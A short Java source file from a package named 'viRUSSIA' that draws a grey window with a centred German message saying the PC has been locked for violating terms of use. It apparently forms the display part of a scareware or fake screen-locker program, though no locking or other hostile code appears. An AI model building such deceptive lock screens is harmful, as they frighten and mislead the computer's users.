package viRUSSIA;

import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;

public class MessageFrame extends Frame {
	String message = "Dieser PC wurde aufgrund Verletzung der Nutzungsregeln gesperrt.";

	public MessageFrame(String message) {
		
		this.message = message;
	}

	public MessageFrame() {

	}

	@Override
	public void paint(Graphics g) {
		super.paint(g);
		g.setFont(new Font("Calibri", Font.PLAIN, 24));

		g.setColor(Color.LIGHT_GRAY);
		g.fillRect(0, 0, getWidth(), getHeight());
		g.setColor(Color.BLACK);
		g.drawString(message,
				getWidth() / 2 - g.getFontMetrics().stringWidth(message) / 2,
				getHeight() / 2);
	}
}
